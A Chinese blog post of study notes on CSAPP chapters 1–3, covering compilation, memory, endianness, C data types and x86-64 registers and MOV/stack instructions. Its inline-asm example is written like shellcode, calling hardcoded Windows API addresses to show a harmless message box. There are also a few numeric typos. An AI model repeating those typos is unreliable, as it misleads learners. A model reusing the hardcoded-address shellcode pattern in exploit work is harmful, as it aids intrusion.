    <content><![CDATA[<p>(๑°⌓︎°๑)  <a href="#jdatatype"><mark class="label primary">数据类型长度</mark></a><a href="#jregister"><mark class="label success">寄存器</mark></a><a href="https://blog.imkasen.com/CSAPP-Answers-CH3.html"><mark class="label warning">第三章练习题1</mark></a><a href="https://conyli.cc/archives/2899"><mark class="label info">第三章练习题2</mark></a><a href="https://ifanze.cn/2018/06/26/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E3%80%8B(3)/"><mark class="label default">第三章读书笔记</mark></a><a href="#duanxu"><mark class="label danger">大端序小端序</mark></a></p>
<span id="more"></span>


<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol>
<li>源程序实际上就是一个由值0和1组成的位（又称为比特序列）8个位被组织成一组，称为字节。<font color="#FF7800"><strong>1 字节（byte）&#x3D;8位（bit）</strong></font></li>
<li>ASCII使用一个唯一的单字节大小的整数值来表示每个字符。每个字节都有一个整数值。每个文本行都是以一个看不见的换行符 “\n” 来结束的 ，他所对应的整数值是10。</li>
</ol>
<h3 id="1-1-C语言程序编译过程"><a href="#1-1-C语言程序编译过程" class="headerlink" title="1.1 C语言程序编译过程"></a>1.1 C语言程序编译过程</h3><blockquote>
<p><font color="#FF7F00"><strong>C源程序 —-&gt;可执行的目标文件</strong></font></p>
</blockquote>
<p>执行这四个阶段的程序（<strong>预处理器、编译器、汇编器和链接器</strong>）一起构成了编译系统（compilation systen）。</p>
<p> <img data-src="https://i.loli.net/2020/09/14/L45tdmbn1crSwAe.png" alt="1C源码编译过程"></p>
<blockquote>
<p>一、预处理阶段（将库文件引入程序：<code>.c--&gt;.i</code>）</p>
<p>第 1 行的<code>#include &lt;stdio.h&gt;</code>命令告诉预处理器读取系统头文件 <code>stdio.h</code>的内容，<font color="#FF7F00"><strong>并把它直接插入程序文本中</strong></font>。结果就得到了另一个 C 程序，通常是以<code>.i</code>作为文件扩展名。</p>
<p>二、编译阶段（将源程序编译成汇编语言：<code>.i--&gt;.s</code>）</p>
<p>三、汇编阶段（将汇编语言汇编为机器语言（二进制）：<code>.s--&gt;.o</code>）</p>
<p>四、链接阶段</p>
<p>请注意，hello程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数。printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中。链接器（ld）就负责处理这种合并。结果就得到 hello文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行。</p>
</blockquote>
<h3 id="1-2-系统的硬件组成"><a href="#1-2-系统的硬件组成" class="headerlink" title="1.2 系统的硬件组成"></a>1.2 系统的硬件组成</h3><ol>
<li><p>总线</p>
<p>贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。<font color="#FF7800"><strong>通常总线被设计成传送定长的字节块，也就是字（word）</strong></font>。字中的<strong>字节数（即字长）是个基本的系统参数</strong>，各个系统中都不尽相同。现在的<strong>大多数机器字长要么是 4 个字节（32 位）</strong>，<strong>要么是 8 个字节（64 位）</strong>。</p>
</li>
<li><p>I&#x2F;O设备</p>
<p>控制器和适配器区别主要在于它们的封装方式。<strong>控制器</strong>是I&#x2F;O设备本身或者系统的主印制电路板(通常称作主板）上的芯片组。而<strong>适配器</strong>则是一块插在主板插槽上的卡。无论如何，它们的功能都是在I&#x2F;O总线和I&#x2F;O设备之间传递信息。</p>
</li>
<li><p>主存</p>
<p>一般来说，组成程序的每条机器指令都由不同数量的字节构成。与 C 程序变量相对应的数据项的大小是根据类型变化的。比如，在运行 Linux 的 x86-64 机器上，short 类型的数据需要 2 个字节，int 和 float 类型需要 4 个字节，而 long 和 double 类型需要 8 个字节。</p>
</li>
<li><p>处理器（CPU）</p>
<p>是<strong>解释（或执行）存储在主存中指令的引擎</strong>。<font color="#FF7800"><strong>CPU的核心</strong></font>是一个<strong>大小为一个字</strong>的存储设备（或<strong>寄存器</strong>），称为<font color="#FF7800"><strong>程序计数器（PC）</strong></font>。PC指向主存中下一条即将执行的指令的地址。</p>
</li>
</ol>
<p><font color="#FF7800"><strong>1WORD &#x3D; 2byte &#x3D; 16bit</strong></font></p>
<blockquote>
<p>CPU处理过程：</p>
<ul>
<li><strong>加载</strong>：从主存复制一个字节或者一个字到寄存器，以覆盖寄存器原来的内容。</li>
<li><strong>存储</strong>：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容</li>
<li><strong>操作</strong>：把两个寄存器的内容复制到 ALU, ALU 对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容。</li>
<li><strong>跳转</strong>：从指令本身中抽取一个字，并将这个字复制到程序计数器（PC）中，以覆盖 PC 中原来的值。</li>
</ul>
</blockquote>
<p>编译好的指令代码（机器指令）存放于磁盘，程序加载时，他们被反复复制到主存；当处理器运行时，指令又从主存复制到处理器。</p>
<p><strong>存储器层次结构</strong></p>
<p><img data-src="https://i.loli.net/2020/09/14/KPcr43GAEN7FeQJ.png" alt="2存储器层次结构"></p>
<p>存储器层次结构的主要思想是上层的存储器作为低一层存储器的高速缓存。</p>
<h3 id="1-3-OS管理硬件"><a href="#1-3-OS管理硬件" class="headerlink" title="1.3 OS管理硬件"></a>1.3 OS管理硬件</h3><p>操作系统是介于硬件和应用程序之间的软件，操作系统有两个基本功能：</p>
<ul>
<li>(1) 防止硬件被失控的应用程序滥用；</li>
<li>(2) 向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。操作系统通过几个基本的抽象概念（<strong>进程、虚拟内存、文件</strong>）来实现这两个功能。<ul>
<li>文件是对I&#x2F;O设备的抽象表示；</li>
<li>虚拟内存是对主存和磁盘I&#x2F;O设备的抽象表示；</li>
<li>进程则是对处理器、主存和I&#x2F;O设备的抽象表示（对一个正在运行程序的抽象）。</li>
<li>虚拟机，它提供对整个计算机的抽象，包括操作系统、处理器和程序。</li>
</ul>
</li>
</ul>
<p><font color="#FF7800"><strong>内核是操作系统代码常驻主存的部分。</strong></font>注意，内核不是一个独立的进程。相反，它是系统管理全部进程所用代码和数据结构的集合。</p>
<p>三种不同类型的并发：并行可以在计算机系统的多个抽象层次上运用。在此，我们按照系统层次结构中<strong>由高到低</strong>的顺序重点强调三个层次。</p>
<ul>
<li><strong>线程级并发</strong>：使用线程，我们甚至能够在一个进程中执行多个控制流。多核处理器（CPU）和超线程出现。<ul>
<li>超线程，有时称为同时多线程（simultaneous multi-threading），是一项允许一个 CPU 执行多个控制流的技术。它涉及 CPU 某些硬件有多个备份，比如程序计数器和寄存器文件，而其他的硬件部分只有一份，比如执行浮点算术运算的单元。<font color="#FF7800"><strong>常规的处理器需要大约 20000 个时钟周期做不同线程间的转换，而超线程的处理器可以在单个周期的基础上决定要执行哪一个线程。</strong></font>这使得 CPU 能够更好地利用它的处理资源。比如，假设一个线程必须等到某些数据被装载到高速缓存中，那 CPU 就可以继续去执行另一个线程。举例来说， Intel Core i7 处理器可以让每个核执行两个线程，所以一个 4 核的系统实际上可以并行地执行 8 个线程。</li>
</ul>
</li>
<li><strong>指令级并行</strong>：在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称为指令级并行。如果处理器可以达到比一个周期一条指令更快的执行速率，就称之为超标量（super scalar）处理器。大多数现代处理器都支持超标量操作（如最近的处理器可以保持每个时钟周期2~4条指令的执行速率）。</li>
<li><strong>单指令、多数据并行</strong>：在最低层次上，许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。例如，较新几代的Intel 和AMD处理器都具有并行地对8对单精度浮点数（C数据类型float）做加法的指令。</li>
</ul>
<h3 id="1-4-计算机系统的层次"><a href="#1-4-计算机系统的层次" class="headerlink" title="1.4 计算机系统的层次"></a>1.4 计算机系统的层次</h3><p><img data-src="https://i.loli.net/2020/09/14/UEMgyax65horTsf.png" alt="3计算机系统的分层视图"></p>
<p><font color="#FF7800"><strong>所有应用程序对硬件的操作尝试都必须通过操作系统。</strong></font></p>
<p>操作系统有两个基本功能：（1）防止硬件被失控的应用程序滥用；（2）向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。操作系统通过几个基本的抽象概念（<strong>进程、虚拟内存、文件</strong>）来实现这两个功能。</p>
<p><img data-src="https://i.loli.net/2020/09/14/BlIfb5Nyr7kPxGt.png" alt="4计算机系统的抽象"></p>
<p>在处理器里，指令集架构提供了对实际处理器硬件的抽象。使用这个抽象，机器代码程序表现得就好像运行在一个一次只执行一条指令的处理器上。</p>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="2-1-数据存储"><a href="#2-1-数据存储" class="headerlink" title="2.1 数据存储"></a>2.1 数据存储</h3><p><font color="#FF7800"><strong>大多数计算机使用8位的块,或者字节(byte)，作为最小的可寻址的内存单位，而不是访问内存中单独的位</strong></font>。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存 ( virtual memory)。内存的每个字节都由一个唯一的数字来标识，称为它的地址(address)，所有可能地址的集合就称为虚拟地址空间( virtual address space)。</p>
<p><span id="jdatatype"><img data-src="https://i.loli.net/2020/09/18/2BuRTaV5NcjCtIU.png" alt="8整数寄存器"></span></p>
<span id="duanxu">
大多数计算机使用8位的块，或者字节(byte)，作为最小的可寻址的内存单位，而不是访问内存中单独的位。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存 (virtual memory)。内存的每个字节都由一个唯一的数字来标识，称为它的地址(address)，所有可能地址的集合就称为虚拟地址空间(virtual address space)。 

<p>某些机器选择在内存中按照从最低有效字节到最高有效字节的顺序存储对象，而另一些机器则按照从最高有效字节到最低有效 字节的顺序存储。前一种规则一最低有效字节在最前面的方式，称为小端法(little endian)。 后一种规则 最高有效字节在最前面的方式，称为大端法(big endian)。即<font color="#FF7800"><strong>小端序和大端序</strong></font>。</p>
<p>假设变量x的类型为int，位于地址0x100 处，它的十六进制值为0x01234567（67为低字节，01为高字节）。 地 址范围0x100~0x103的字节顺序依赖于机器的类型:</p>
<p><img data-src="https://i.loli.net/2020/09/25/MFCsBqXHQuNlaxL.png" alt="6大小端序数据表示.png"></p>
<p>注意，在字0x01234567中，高位字节的十六进制值为0x01，而低位字节值为0x67。<font color="#FF7800"><strong>小端序（Little-Endian）：高字节存于高地址，低字节存于低地址</strong></font></p>
<p><strong>Android(来自Google)和IOS(来自Apple)只能运行于小端模式</strong>。<br></span></p>
<h3 id="2-2-C语言扩展"><a href="#2-2-C语言扩展" class="headerlink" title="2.2 C语言扩展"></a>2.2 C语言扩展</h3><p>C语言中的<code>typedef</code>声明提供了一种给<font color="#FF7800"><strong>数据类型</strong></font>命名的方式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> *int_pointer; int_ pointer ip; 等价于</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span>* int_pointer; int_ pointer ip; 也等价于</span><br><span class="line"><span class="keyword">int</span> *ip;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong><code>printf</code>格式化输出</strong></p>
<p>在格式串里，每个以<code>%</code>开始的字符序列都表示如何格式化下一个参数。典型的示例包括: <code>%d</code> 是输出一个有符号十进制整数，<code>%u</code> 是输出一个无符号十进制整数，<code>%x</code> 是输出一个十六进制数字，<code>%f</code>是输出一个浮点 数，而<code>%c</code>是输出一个字符，其编码由参数给出。</p>
</li>
<li><p><strong>指针的创建和间接引用</strong></p>
<p><font color="#FF7800"><strong>C的 “取地址”运算符<code>&amp;</code>创建一个指针</strong></font>。表达式<code>&amp;x</code>创建了一个指向保存变量x的位置的指针。这个指针的类型取决于x的类型，因此这三个指针的类型分别为<code>int*</code>、 <code>float*</code>和<code>void **</code>。(数据类型<code>void *</code>是一种特殊类型的指针，没有相关联的类型信息。)</p>
<div class="note warning"><p><font color="#FF7800"><strong>这里给出的这些强制类型转换不会改变真实的指针，它们只是告诉编译器以新的数据类型来看待被指向的数据</strong></font>。</p>
</div>
</li>
<li><p><strong>字符串表示</strong></p>
<p>C语言中字符串被编码为一个以null(其值为0)字符结尾的字符数组。</p>
</li>
<li><p><strong>移位运算</strong></p>
<ul>
<li>左移：<code>x&lt;&lt;k</code>表示x向左移动k位，丟弃最高的k位，并在右端补k个0。如x&#x3D;[01100011]，<code>x&lt;&lt;4</code>为[0011<font color="#009688"><em>0000</em></font>]。</li>
<li>逻辑右移：<code>x&gt;&gt;k</code>表示x向右移动k位并在左端补k个0。如x&#x3D;[01100011]，<code>x&gt;&gt;4</code>（逻辑右移）为[<font color="#009688"><em>0000</em></font>0110]。</li>
<li>算术右移：<code>x&gt;&gt;k</code>表示在左端补k个<font color="#FF7800"><strong>最高有效位</strong></font>的值，如x&#x3D;[10010101]，<code>x&gt;&gt;4</code>（算术右移）为[<font color="#009688"><em>1111</em></font>1001]。</li>
</ul>
</li>
</ol>
<p>实际上，几乎所有的编译器&#x2F;机器组合都对有符号数使用<strong>算术右移</strong>，另一方面，<strong>对于无符号数，右移必须是逻辑的</strong>。与C相比，Java对于如何进行右移有明确的定义。<strong>表达是<code>x&gt;&gt;k</code>会将x算术右移k个位置，而<code>x&gt;&gt;&gt;k</code>会对X做逻辑右移</strong>。</p>
<div class="note warning"><p>注意：当<code>x&lt;&lt;k</code>移动k位时，k&gt;w时（这里w是x的位数），因此实际上位移量就是通过计算（k mod w）得到的。</p>
<p>假设数据类型<code>int</code>为w&#x3D;32：</p>
<p>int       lval  &#x3D; 0xFEDCBA98   &lt;&lt; 32; </p>
<p>int       aval &#x3D; 0xFEDCBA98   &gt;&gt; 36;</p>
<p>unsigned uval &#x3D; 0xFEDCBA98u &gt;&gt; 40 ;</p>
<p>当w&#x3D;32时，上面三个移位运算分别是移动0、4和8位，得到结果:</p>
<p>lval   0xFEDCBA98</p>
<p>aval  0xFFEDCBA9</p>
<p>uval  0x00FEDCBA</p>
<p><font color="#FF7800"><strong>不过这种行为对于C程序来说是没有保证的，所以应该保持位移量小于待移位值的位数。另一方面，Java特别要求位移数量应该按照我们求模的方法来计算。</strong></font></p>
</div>



<div class="note success"><p>C、C++t和Java中的有符号和无符号数</p>
<p>C和C++都支持有符号(默认)和无符号数。Java只支持有符号数。 </p>
</div>



<p>当在int、float 和double格式之间进行强制类型转换时，程序改变数值和位模式 的原则如下(假设int是32位的): </p>
<ul>
<li>从int转换成float，数字不会溢出，但是可能被舍入。 </li>
<li>从int或float转换成double，因为double有更大的范围(也就是可表示值的范 围)，也有更高的精度(也就是有效位数)，所以能够保留精确的数值。</li>
<li>从double转换成float， 因为范围要小一些，所以值可能溢出成十∞或一∞。另 外，由于精确度较小，它还可能被舍人。</li>
<li>从float或者double转换成int，值将会向零舍人。例如，1.999将被转换成1, 而一1.999将被转换成一1。进一步来说，值可能会溢出。C语言标准没有对这种情 况指定固定的结果。与Intel兼容的微处理器指定位模式[10…00](字长为w时的 TMinw )为整数不确定(integer indefinite)值。一个从浮点数到整数的转换，如果不 能为该浮点数找到一个合理的整数近似值，就会产生这样一个值。因此，表达式 (int)+1e10会得到-21483648，即从一个正值变成了一个负值。</li>
</ul>
<h3 id="2-3-数据类型长度"><a href="#2-3-数据类型长度" class="headerlink" title="2.3 数据类型长度"></a>2.3 数据类型长度</h3><p><img data-src="https://i.loli.net/2020/10/12/2yWJaz5xG9YljmE.png" alt="1932位数据类型取值范围.png"></p>
<p><img data-src="https://i.loli.net/2020/10/12/cziJsFKpewjkUmA.png" alt="1A64位数据类型取值范围.png"></p>
<p>图2-9和图2-10中一个很值得注意的特点是<strong>取值范围不是对称的一负数的范围比整数的范围大 1</strong>。</p>
<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="3-1-AT-amp-T与Intel汇编语言的比较"><a href="#3-1-AT-amp-T与Intel汇编语言的比较" class="headerlink" title="3.1 AT&amp;T与Intel汇编语言的比较"></a>3.1 AT&amp;T与Intel汇编语言的比较</h3><p>Linux是Unix家族的一员，尽管Linux的历史不长，但与其相关的很多事情都发源于Unix。就Linux所使用的386汇编语言而言，它也是起源于Unix。Unix最初是为PDP－11开发的，曾先后被移植到VAX及68000系列的处理器上，这些处理器上的汇编语言都采用的是AT&amp;T的指令格式。当Unix被移植到i386时，自然也就采用了AT&amp;T的汇编语言格式，而不是Intel的格式。尽管这两种汇编语言在语法上有一定的差异，但所基于的硬件知识是相同的，因此，如果非常熟悉Intel的语法格式，那么也可以很容易地把它“移植“到AT&amp;T来。下面通过对照Intel与AT&amp;T的语法格式，以便于把过去的知识能很快地“移植”过来。</p>
<h4 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h4><p>在Intel的语法中，寄存器和和立即数都没有前缀。但是在AT&amp;T中，寄存器前冠以<code>％</code>，而立即数前冠以<code>$</code>。在Intel的语法中，十六进制和二进制立即数后缀分别冠以<code>h</code>和<code>b</code>，而在AT&amp;T中，十六进制立即数前冠以<code>0x</code>。</p>
<p><a href="https://blog.csdn.net/kennyrose/article/details/7575952?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.edu_weight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.edu_weight">intel汇编 和 AT&amp;T汇编 的区别</a></p>
<div class="note primary no-icon"><ul>
<li><strong>程序内存包含</strong>：程序的可执行机器代码、操作系统需要的一些信息、用来管理过程调用和返回的运行时栈、以及用户分配的内存块（比如说用malloc库函数分配的）。</li>
<li>x86的寻址是32位，所以一个地址块为4个字节（32位）；x86-64的寻址是64位，所以一个地址块是8个字节（64位），<strong>但是在目前的实现中，这些地址的高16位（最高两个字节）必须设置为0</strong>。</li>
</ul>
</div>

<h3 id="3-2-在C语言程序中嵌入汇编代码"><a href="#3-2-在C语言程序中嵌入汇编代码" class="headerlink" title="3.2 在C语言程序中嵌入汇编代码"></a>3.2 在C语言程序中嵌入汇编代码</h3><p>使用asm伪代码可以在C程序中包含简短的汇编代码，如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HINSTANCE LibHandle;</span><br><span class="line">  <span class="keyword">char</span> dllbuf[<span class="number">11</span>]=<span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">  LibHandle=LoadLibrary(dllbuf);</span><br><span class="line">  _asm&#123;</span><br><span class="line">    sub sp,<span class="number">0x440</span></span><br><span class="line">    <span class="keyword">xor</span> ebx,ebx</span><br><span class="line">    push ebx</span><br><span class="line">    push <span class="number">0x656b6f6a</span></span><br><span class="line">    push <span class="number">0x73696854</span></span><br><span class="line">    mov eax,esp</span><br><span class="line">    push ebx</span><br><span class="line">    push eax</span><br><span class="line">    push eax</span><br><span class="line">    push ebx</span><br><span class="line">    mov eax,<span class="number">0x77d5085c</span></span><br><span class="line">    call eax</span><br><span class="line">    push ebx</span><br><span class="line">    mov eax,<span class="number">0x7c81cafa</span></span><br><span class="line">    call eax</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-3-数据格式"><a href="#3-3-数据格式" class="headerlink" title="3.3 数据格式"></a>3.3 数据格式</h3><p>由于是从16位体系结构扩展成32位的，Intel 用术语”字(<code>word</code>)“表示16位数据类型。因此，称32位数为 “双字(<code>double words</code>)”，称64位数为“四字(<code>quad words</code>)”。</p>
<p> C语言基本数据类型对应的x86-64 表示时（x86-64 指令集同样包括完整的针对字节、字 和双字的指令。）：</p>
<ul>
<li>标准int值存储为双字(32位)。 </li>
<li>指针(在此用<code>char *</code>表示)存储为8字节的四字，64位机器本来就预期如此。</li>
<li>数据类型long实现为64位，允许表示的值范围较大。</li>
</ul>
<p><img data-src="https://i.loli.net/2020/09/24/j6D2bXolJpdivk3.png" alt="7"></p>
<blockquote>
<p>如图所示，大多数GCC生成的汇编代码指令都有一个字符的后缀，表明操作数的大小。例如，数据传送指令有四个变种: </p>
<ul>
<li><code>movb</code>  --&gt; 传送字节</li>
<li><code>movw</code>  --&gt; 传送字</li>
<li><code>movl</code>  --&gt; 传送双字</li>
<li><code>movq</code>  --&gt;传送四字</li>
</ul>
</blockquote>
<div class="note warning"><p>后缀<code>l</code>用来表示双字，因为32位数被看成是“长字( <code>long word</code>)”。注意，汇编代码也使用后缀<code>l</code>来表示4字节整数和8字节双精度浮点数。这不会产生歧义，因为浮点数使用的是一组完全不同的指令和寄存器。</p>
</div>

<h3 id="3-4-访问信息（寄存器使用）"><a href="#3-4-访问信息（寄存器使用）" class="headerlink" title="3.4 访问信息（寄存器使用）"></a>3.4 访问信息（寄存器使用）</h3><p>一个x86-64的中央处理单元(CPU)包含一组<mark class="label primary">16个存储64位值的通用目的寄存器</mark>。这些寄存器用来存储整数数据和指针。图3-2显示了这16个寄存器。它们的名字都以<code>%r</code>开头，不过后面还跟着一些不同的命名规则的名字，这是由于指令集历史演化造成的。最初的8086中有8个16位的寄存器，即图3-2中的<code>%ax</code>到<code>%bp</code>。每个寄存器都有特殊的用途，它们的名字就反映了这些不同的用途。扩展到IA32架构时，这些寄存器也扩展成32位寄存器，标号从<code>%eax</code>到<code>%ebp</code>扩展到x86-64后，原来的8个寄存器扩展成64位，标号从号<code>%rax</code>到<code>%rbp</code>。除此之外，还增加了8个新的寄存器，它们的标号是按照新的命名规则制定的：从号<code>%r8</code>到<code>%r15</code>。</p>
<blockquote>
<ul>
<li>64位  --&gt; <code>%r</code></li>
<li>32位  --&gt; <code>%e</code></li>
<li>16位  --&gt; <code>%</code></li>
</ul>
</blockquote>
<p><span id="jregister"><img data-src="https://i.loli.net/2020/09/25/mNzrsVfRATo5jba.png" alt="8整数寄存器"></span> </p>
<p>当指令以寄存器作为目标时，对于生成小于8字节结果的指令，寄存器中剩下的字节会怎么样，对此有两条规则：</p>
<ul>
<li>生成1字节和2字节数字的指令会保持剩下的字节不变</li>
<li>生成4字节数字的指令会把高位4个字节置为0。</li>
</ul>
<div class="note warning"><p>后面这条规则是作为从IA32到x86-64的扩展的一部分而采用的。</p>
</div>

<h4 id="3-4-1-操作数指示符"><a href="#3-4-1-操作数指示符" class="headerlink" title="3.4.1 操作数指示符"></a>3.4.1 操作数指示符</h4><p>大多数指令有一个或者是多个操作数，源数据值可以是常数、寄存器或是内存中读出；结果可以存放在寄存器或者内存中。操作数分为三种类型：</p>
<ul>
<li><strong>立即数</strong>：表是常数值，在ATT格式的汇编代码中，立即数的书写方式是<code>$</code>后面跟一个用标准C表示法表示的整数，比如，<code>$-577</code> 或<code>$0x1F</code>。不同的指令允许的立即数值范围不同，汇编器会自动选择最紧凑的方式进行数值编码。</li>
<li><strong>寄存器</strong>(register)，它表示某个寄存器的内容，用符号$r_a$来表示任意寄存器a，用引用$R[r_a]$来表示它的值，这是将寄存器集合看成一个数组R，用寄存器标识符作为索引。</li>
<li><strong>内存引用</strong>：它会根据计算出来的地址（通常称为有效地址）访问某个内存位置。因为将内存看成一个很大的字节数组，我们用符号$M_b[Addr]$表示对存储在内存中从地址Addr开始的b个字节值的引用。为了简便，通常省去下标b。内存引用的不同寻址方式：<ul>
<li>$M_b[Addr]$表示对存储在内存中从地址Addr开始的b个字节值的引用。</li>
<li>$Imm(r_b,r_i,s)$这样的引用有四个组成部分：<ol>
<li>立即数偏移 $Imm$</li>
<li>基址寄存器$r_b$</li>
<li>变址寄存器$r_i$</li>
<li>比例因子$s$</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>这里$s$必须是1、2、4或者 8。基址和变址寄存器都必须是64位寄存器。有效地址被计算为$Imm+R[r_b]+R[r_i]·s$。引用数组元素时，会用到这种通用形式。其他形式都是这种通用形式的特殊情况，只是省略了某些部分。</p>
<p><img data-src="https://i.loli.net/2020/09/29/fSiJIEmO6cnWaub.png" alt="9操作数格式.png"></p>
<p><img data-src="https://i.loli.net/2020/09/30/2FTBNRVbcZXS69A.png" alt="A操作数计算.png"></p>
<h4 id="3-4-2-数据传送指令"><a href="#3-4-2-数据传送指令" class="headerlink" title="3.4.2 数据传送指令"></a>3.4.2 数据传送指令</h4><p>$MOV$作用：最频繁使用的指令是<strong>将数据从一个位置复制到另一个位置的指令</strong>。这些指令把数据从源位置<strong>复制</strong>到目的位置，不做任何变化。</p>
<ol>
<li>源操作数指定的值是一个<strong>立即数</strong>，存储在寄存器中或者内存中。</li>
<li>目的操作数指定一个<strong>位置</strong>，要么是一个寄存器，要么是一个内存地址。</li>
<li><mark class="label danger">x86-64加了一条限制，传送指令的两个操作数不能都指向内存位置，将一个值从一个内存位置复制到另一个内存位置需要两条指令：</mark>
<ul>
<li>第一条指令将源值加载到寄存器中</li>
<li>第二条将该寄存器值写人目的位置</li>
</ul>
</li>
</ol>
<p>这些指令的寄存器操作数可以是16个寄存器有标号部分中的任意一个，寄存器部分的大小必须与指令最后一个字符($b，w，1或q$)指定的大小匹配。大多数情况中，MOV指令只会更新目的操作数指定的那些寄存器字节或内存位置。唯一的例外是movl指令以寄存器作为目的时，它会把该寄存器的高位4字节设置为0。造成这个例外的原因是x86-64采用的惯例，即任何为寄存器生成32位值的指令都会把该寄存器的高位部分置成0。</p>
<p><img data-src="https://i.loli.net/2020/09/29/ys3FJVB7ueLIvqn.png" alt="B数据传送指令.png"></p>
<mark class="label primary">举个MOV数据传送的例子</mark>

<p><img data-src="https://i.loli.net/2020/09/29/2gtPeAzj7N5krd8.png" alt="CMOV数据传送.png"></p>
<div class="note warning"><p><code>movl</code>指令以寄存器作为目的时，它会把该<mark class="label danger">寄存器的高位4字节设置为0</mark>。造成这个例外的原因是x86-64采用的惯例，即任何为寄存器生成32位值的指令都会把该寄存器的高位部分置成0。</p>
</div>

<p>还有两大类数据传送指令：<a href="#jumpz"><mark class="label warning">MOVZ</mark></a><a href="#jumps"><mark class="label success">MOVS</mark></a></p>
<p>这两类指令将较小的源值复制到较大的目的时使用，这两类指令都把源（在寄存器或内存中）复制到<strong>目的寄存器</strong>。上面的<code>movl</code>指令以寄存器为目的时，会将目的寄存器的高32位都置0。</p>
<ul>
<li><span id="jumpz"><mark class="label warning">MOVZ</mark><mark class="label primary">将目的寄存器的剩余的字节填充为0</mark></span><mark class="label success">用于无符号数的扩展（习题3.4)</mark></li>
<li><span id="jumps"><mark class="label success">MOVS</mark><mark class="label primary">通过符号扩展来填充，将目的寄存器的剩余的字节填充为源寄存器的最高位</mark></span><mark class="label success">用于有符号数的扩展</mark></li>
</ul>
<p>下图可以观察到，每条指令名字的最后两个字符都是大小指示符：</p>
<ul>
<li>第一个字符指定源的大小</li>
<li>第二个指明目的的大小</li>
</ul>
<p><img data-src="https://i.loli.net/2020/09/30/oLcZSKu7ab62gm3.png" alt="D符号扩展数据传送指令.png"></p>
<mark class="label primary">MOV</mark><mark class="label warning">MOVZ</mark><mark class="label success">MOVS</mark>

<p><img data-src="https://i.loli.net/2020/09/30/E27d9oZOSHVv5lP.png" alt="E字节传送指令比较.png"></p>
<p><strong>注意</strong>：</p>
<ul>
<li>函数的参数通过寄存器传递给函数。</li>
<li>函数通过把值存储在寄存器<code>%rax</code>或该寄存器某个低位部分中返回。</li>
<li>间接引用指针就是将该指针放在一个寄存器中，则取得的操作数就是以寄存器的值为地址，对应取出的操作数。</li>
<li>局部变量通常是保存在寄存器中，而不是内存中。</li>
</ul>
<h4 id="3-4-3-将数据压栈和出栈"><a href="#3-4-3-将数据压栈和出栈" class="headerlink" title="3.4.3 将数据压栈和出栈"></a>3.4.3 将数据压栈和出栈</h4><p>栈是一种数据结构，可以添加或者删除值，不过要遵循<mark class="label danger">后进先出</mark>的原则。</p>
<ul>
<li><mark class="label warning">通过push操作把数据压人栈中，通过pop操作删除数据</mark></li>
<li>弹出的值永远是最近被压人而且仍然在栈中的值。</li>
<li>栈可以实现为一个数组，总是从数组的一端插人和删除元素。这一端被称为<mark class="label info">栈顶</mark>。</li>
<li>在x86-64中，程序栈存放在内存中某个区域。</li>
<li><mark class="label danger">栈向下增长</mark>，这样一来，<mark class="label danger">栈顶元素的地址是所有栈中元素地址中最低的</mark></li>
<li>栈指针<mark class="label success">%rsp</mark>保存着栈顶元素的地址</li>
<li><code>push</code>和<code>pop</code>指令都会自动修改<code>%rsp</code>的值，有两种方式调整<code>%rsp</code>的值，一种是直接进行加减运算，另一种是<code>push</code>和<code>pop</code>指令</li>
</ul>
<p>将一个四字值压人栈中，首先要将<mark class="label info">%rsp栈指针减8，然后将值写到新的栈顶地址</mark></p>
<p><img data-src="https://i.loli.net/2020/10/05/GwYot94ihDRcXCI.png" alt="F入栈和出栈指令.png"></p>
<mark class="label success">pushq %rbp</mark>指令等价于如下指令：

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">subq $<span class="number">8</span>, %rsp            <span class="comment">//Decrement stack pointer </span></span><br><span class="line">movq %rbp , (%rsp)       <span class="comment">//Store %rbp on stack</span></span><br></pre></td></tr></table></figure>

<p>它们之间的区别是在机器代码中<code>pushq</code>指令编码为1个字节，而上面那两条指令一共需要 8个字节。</p>
<p><img data-src="https://i.loli.net/2020/10/05/3G5oiql2Kv1dQmR.png" alt="10栈操作说明.png"></p>
<mark class="label success">popq %rax</mark>指令等价于如下指令：

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">movq (%rsp) , %rax    <span class="comment">//Read %rax from stack </span></span><br><span class="line">addq $<span class="number">8</span> ,%rsp         <span class="comment">//Increment stack pointer</span></span><br></pre></td></tr></table></figure>

